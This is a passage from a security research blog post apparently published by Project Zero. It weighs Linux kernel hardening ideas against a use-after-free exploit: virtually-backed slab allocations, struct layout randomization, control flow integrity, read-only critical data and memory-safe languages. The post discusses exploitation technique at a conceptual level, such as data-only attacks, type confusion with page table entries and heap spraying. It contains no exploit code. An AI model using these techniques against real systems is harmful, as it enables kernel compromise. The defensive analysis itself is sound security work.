<p>A weaker but less CPU-intensive alternative to trying to provide complete use-after-free protection for individual objects would be to ensure that <em>virtual</em> addresses that have been used for slab memory are never reused outside the slab, but that physical pages can still be reused. This would be the same basic approach as used by <a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md#security">PartitionAlloc</a> and others. In kernel terms, that would essentially mean serving SLUB allocations from vmalloc space.</p>
<p>Some challenges I can think of with this approach are:</p>
<ul>
<li>SLUB allocations are currently served from the linear mapping, which normally uses hugepages; if vmalloc mappings with 4K PTEs were used instead, TLB pressure might increase, which might lead to some performance degradation.</li>
<li>To be able to use SLUB allocations in contexts that operate directly on physical memory, it is sometimes necessary for SLUB pages to be physically contiguous. That's not really a problem, but it is different from default vmalloc behavior. (Sidenote: DMA buffers don't always have to be physically contiguous - if you have an IOMMU, you can use that to map discontiguous pages to a contiguous DMA address range, just like how normal page tables create virtually-contiguous memory. See <a href="https://git.kernel.org/linus/7d5b5738d151">this kernel-internal API</a> for an example that makes use of this, and <a href="https://fuchsia.dev/fuchsia-src/concepts/drivers/driver_development/dma">Fuchsia's documentation</a> for a high-level overview of how all this works in general.)</li>
<li>Some parts of the kernel convert back and forth between virtual addresses, <code>struct page</code> pointers, and (for interaction with hardware) physical addresses. This is a relatively straightforward mapping for addresses in the linear mapping, but would become a bit more complicated for vmalloc addresses. In particular, <code>page_to_virt()</code> and <code>phys_to_virt()</code> would have to be adjusted.
<ul>
<li>This is probably also going to be an issue for things like Memory Tagging, since pointer tags will have to be reconstructed when converting back to a virtual address. Perhaps it would make sense to forbid these helpers outside low-level memory management, and change existing users to instead keep a normal pointer to the allocation around? Or maybe you could let pointers to <code>struct page</code> carry the tag bits for the corresponding virtual address in unused/ignored address bits?</li>
</ul>
</li>
</ul>
<p>The probability that this defense can prevent UAFs from leading to exploitable type confusion depends somewhat on the granularity of slabs; if specific struct types have their own slabs, it provides more protection than if objects are only grouped by size. So to improve the utility of virtually-backed slab memory, it would be necessary to replace the generic kmalloc slabs (which contain various objects, grouped only by size) with ones that are segregated by type and/or allocation site. (The grsecurity/PaX folks have vaguely alluded to doing something roughly along these lines using compiler instrumentation.)</p>
<h2>After reallocation as pagetable: Structure layout randomization</h2>
<p>Memory safety issues are often exploited in a way that involves creating a type confusion; e.g. exploiting a use-after-free by replacing the freed object with a new object of a different type.</p>
<p>A defense that first appeared in grsecurity/PaX is to shuffle the order of struct members at build time to make it harder to exploit type confusions involving structs; the upstream Linux version of this is in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/gcc-plugins/randomize_layout_plugin.c">scripts/gcc-plugins/randomize_layout_plugin.c</a>.</p>
<p>How effective this is depends partly on whether the attacker is forced to exploit the issue as a confusion between two structs, or whether the attacker can instead exploit it as a confusion between a struct and an array (e.g. containing characters, pointers or PTEs). Especially if only a single struct member is accessed, a struct-array confusion might still be viable by spraying the entire array with identical elements. Against the type confusion described in this blogpost (between <code>struct pid</code> and page table entries), structure layout randomization could still be somewhat effective, since the reference count is half the size of a PTE and therefore can randomly be placed to overlap either the lower or the upper half of a PTE. (Except that the upstream Linux version of randstruct only randomizes explicitly-marked structs or structs containing only function pointers, and <code>struct pid</code> has no such marking.)</p>
<p>Of course, drawing a clear distinction between structs and arrays oversimplifies things a bit; for example, there might be struct types that have a large number of pointers of the same type or attacker-controlled values, not unlike an array.</p>
<p><em>If</em> the attacker can not completely sidestep structure layout randomization by spraying the entire struct, the level of protection depends on how kernel builds are distributed:</p>
<ul>
<li>If the builds are created centrally by one vendor and distributed to a large number of users, an attacker who wants to be able to compromise users of this vendor would have to rework their exploit to use a different type confusion for each release, which may force the attacker to rewrite significant chunks of the exploit.</li>
<li>If the kernel is individually built per machine (or similar), and the kernel image is kept secret, an attacker who wants to reliably exploit a target system may be forced to somehow leak information about some structure layouts and either prepare exploits for many different possible struct layouts in advance or write parts of the exploit interactively after leaking information from the target system.</li>
</ul>
<p>To maximize the benefit of structure layout randomization in an environment where kernels are built centrally by a distribution/vendor, it would be necessary to make randomization a boot-time process by making structure offsets relocatable. (Or install-time, but that would break code signing.) Doing this cleanly (for example, such that 8-bit and 16-bit immediate displacements can still be used for struct member access where possible) would probably require a lot of fiddling with compiler internals, from the C frontend all the way to the emission of relocations. A somewhat hacky version of this approach already exists for C-&gt;BPF compilation as <a href="https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html">BPF CO-RE</a>, using the clang builtin <a href="https://clang.llvm.org/docs/LanguageExtensions.html#builtin-preserve-access-index"><code>__builtin_preserve_access_index</code></a>, but that relies on debuginfo, which probably isn't a very clean approach.</p>
<p>Potential issues with structure layout randomization are:</p>
<ul>
<li>If structures are hand-crafted to be particularly cache-efficient, fully randomizing structure layout could worsen cache behavior. The existing randstruct implementation optionally avoids this by trying to randomize only within a cache line.</li>
<li>Unless the randomization is applied in a way that is reflected in DWARF debug info and such (<a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=84052">which it isn't in the existing GCC-based implementation</a>), it can make debugging and introspection harder.</li>
<li>It can break code that makes assumptions about structure layout; but such code is gross and should be cleaned up anyway (and Gustavo Silva <a href="https://github.com/KSPP/linux/issues/109">has been working</a> on fixing some of those issues).</li>
</ul>
<p>While structure layout randomization by itself is limited in its effectiveness by struct-array confusions, it might be more reliable in combination with limited heap partitioning: If the heap is partitioned such that only struct-struct confusion is possible, and structure layout randomization makes struct-struct confusion difficult to exploit, and no struct in the same heap partition has array-like properties, then it would probably become much harder to directly exploit a UAF as type confusion. On the other hand, if the heap is already partitioned like that, it might make more sense to go all the way with heap partitioning and create one partition per type instead of dealing with all the hassle of structure layout randomization.</p>
<p>(By the way, if structure layouts are randomized, padding should probably also be randomized explicitly instead of always being on the same side to maximally randomize structure members with low alignment; see <a href="https://lore.kernel.org/kernel-hardening/CAG48ez1Mr1FNCDGFscVg0SpuuA_Z4tn=WJhEqJVWW1rOuRiG2w@mail.gmail.com/">my list post on this topic</a> for details.)</p>
<h2>Control Flow Integrity</h2>
<p><strong>I want to explicitly point out that kernel Control Flow Integrity would have had no impact at all on this exploit strategy</strong>. By using a data-only strategy, we avoid having to leak addresses, avoid having to find ROP gadgets for a specific kernel build, and are completely unaffected by any defenses that attempt to protect kernel code or kernel control flow. Things like getting access to arbitrary files, increasing the privileges of a process, and so on don't require kernel instruction pointer control.</p>
<p>Like in <a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">my last blogpost on Linux kernel exploitation</a> (which was about a buggy subsystem that an Android vendor added to their downstream kernel), to me, a data-only approach to exploitation feels very natural and seems less messy than trying to hijack control flow anyway.</p>
<p>Maybe things are different for userspace code; but for attacks by userspace against the kernel, I don't currently see a lot of utility in CFI because it typically only affects one of many possible methods for exploiting a bug. (Although of course there could be specific cases where a bug can only be exploited by hijacking control flow, e.g. if a type confusion only permits overwriting a function pointer and none of the permitted callees make assumptions about input types or privileges that could be broken by changing the function pointer.)</p>
<h2>Making important data readonly</h2>
<p>A defense idea that has shown up in a bunch of places (including Samsung phone kernels and XNU kernels for iOS) is to make data that is crucial to kernel security read-only except when it is intentionally being written to - the idea being that even if an attacker has an arbitrary memory write, they should not be able to directly overwrite specific pieces of data that are of exceptionally high importance to system security, such as credential structures, page tables, or <a href="https://googleprojectzero.blogspot.com/2020/07/the-core-of-apple-is-ppl-breaking-xnu.html">(on iOS, using PPL) userspace code pages</a>.</p>
<p>The problem I see with this approach is that a large portion of the things a kernel does are, in some way, critical to the correct functioning of the system and system security. MMU state management, task scheduling, memory allocation, <a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">filesystems</a>, page cache, IPC, ... - if any one of these parts of the kernel is corrupted sufficiently badly, an attacker will probably be able to gain access to all user data on the system, or use that corruption to feed bogus inputs into one of the subsystems whose own data structures are read-only.</p>
<p>In my view, instead of trying to split out the most critical parts of the kernel and run them in a context with higher privileges, it might be more productive to go in the opposite direction and try to approximate something like a proper microkernel: Split out drivers that don't strictly need to be in the kernel and run them in a lower-privileged context that interacts with the core kernel through proper APIs. Of course that's easier said than done! But Linux does already have APIs for safely accessing PCI devices (VFIO) and USB devices from userspace, although userspace drivers aren't exactly its main usecase.</p>
<p>(One might also consider making page tables read-only not because of their importance to system integrity, but because the structure of page table entries makes them nicer to work with in exploits that are constrained in what modifications they can make to memory. I dislike this approach because I think it has no clear conclusion and it is highly invasive regarding how data structures can be laid out.)</p>
<h1>Conclusion</h1>
<p>This was essentially a boring locking bug in some random kernel subsystem that, if it wasn't for memory unsafety, shouldn't really have much of a relevance to system security. I wrote a fairly straightforward, unexciting (and admittedly unreliable) exploit against this bug; and probably the biggest challenge I encountered when trying to exploit it on Debian was to properly understand how the SLUB allocator works.</p>
<p>My intent in describing the exploit stages, and how different mitigations might affect them, <strong>is to highlight that the further a memory corruption exploit progresses, the more options an attacker gains; and so as a general rule, the earlier an exploit is stopped, the more reliable the defense is. Therefore, even if defenses that stop an exploit at an earlier point have higher overhead, they might still be more useful</strong>.</p>
<p>I think that the current situation of software security could be dramatically improved - in a world where a little bug in some random kernel subsystem can lead to a full system compromise, the kernel can't provide reliable security isolation. Security engineers should be able to focus on things like buggy permission checks and core memory management correctness, and not have to spend their time dealing with issues in code that ought to not have any relevance to system security.</p>
<p>In the short term, there are some band-aid mitigations that could be used to improve the situation - like heap partitioning or fine-grained UAF mitigation. These might come with some performance cost, and that might make them look unattractive; but I still think that they're a better place to invest development time than things like CFI, which attempts to protect against much later stages of exploitation.</p>
<p>In the long term, I think something has to change about the programming language - plain C is simply too error-prone. Maybe the answer is Rust; or maybe the answer is to introduce enough annotations to C (along the lines of <a href="https://www.microsoft.com/en-us/research/project/checked-c/">Microsoft's Checked C project</a>, although as far as I can see they mostly focus on things like array bounds rather than temporal issues) to allow Rust-equivalent build-time verification of locking rules, object states, refcounting, void pointer casts, and so on. Or maybe another completely different memory-safe language will become popular in the end, neither C nor Rust?</p>
<p>My hope is that perhaps in the mid-term future, we could have a statically verified, high-performance core of kernel code working together with instrumented, runtime-verified, non-performance-critical legacy code, such that developers can make a tradeoff between investing time into backfilling correct annotations and run-time instrumentation slowdown without compromising on security either way.</p>
<h1>TL;DR</h1>
<p><strong>memory corruption is a big problem because small bugs even outside security-related code can lead to a complete system compromise; and to address that, it is important that we:</strong></p>
<ul>
<li>
<p>in the short to medium term:</p>
<ul>
<li><strong>design new memory safety mitigations</strong>:
<ul>
<li>ideally, that can stop attacks at an early point where attackers don't have a lot of alternate options yet
<ul>
<li>maybe at the memory allocator level (i.e. SLUB)</li>
</ul>
</li>
<li>that can't be broken using address tag leaks (or we try to prevent tag leaks, but that's really hard)</li>
</ul>
</li>
<li><strong>continue using attack surface reduction</strong>
<ul>
<li>in particular seccomp</li>
</ul>
</li>
<li><strong>explicitly prevent untrusted code from gaining important attack primitives</strong>
<ul>
<li>like FUSE, and potentially consider fine-grained scheduler control</li>
</ul>
</li>
</ul>
</li>
<li>
<p>in the long term:</p>
<ul>
<li><strong>statically verify correctness of most performance-critical code</strong>
<ul>
<li>this will require determining how to retrofit annotations for object state and locking onto legacy C code</li>
<li>consider designing runtime verification just for gaps in static verification</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/8464515825658328843/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html
## @title
 How a simple Linux kernel memory corruption bug can lead to complete system compromise
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
